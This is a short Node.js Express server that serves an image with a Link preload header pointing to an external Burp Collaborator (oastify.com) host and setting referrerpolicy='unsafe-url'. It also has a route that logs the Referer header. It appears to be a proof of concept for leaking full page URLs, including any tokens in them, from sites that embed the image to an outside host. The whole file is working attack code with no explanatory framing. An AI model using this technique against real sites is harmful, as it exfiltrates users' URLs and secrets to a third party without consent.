const express = require('express');
const app = express();
const port = 3000;
const path = require('path');

app.get('/image', (req, res) => {
  res.setHeader(
    'Link',
    '<https://yy02j9pfoty2ss2ymj1crshx0o6fuci1.oastify.com/log>;rel="preload"; as="image"; referrerpolicy="unsafe-url"'
  );
  res.sendFile(path.join(__dirname, 'logo.jpg'));
});

app.get('/log', (req, res) => {
  console.log(req.headers['referer']);
  res.send('Hi!');
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
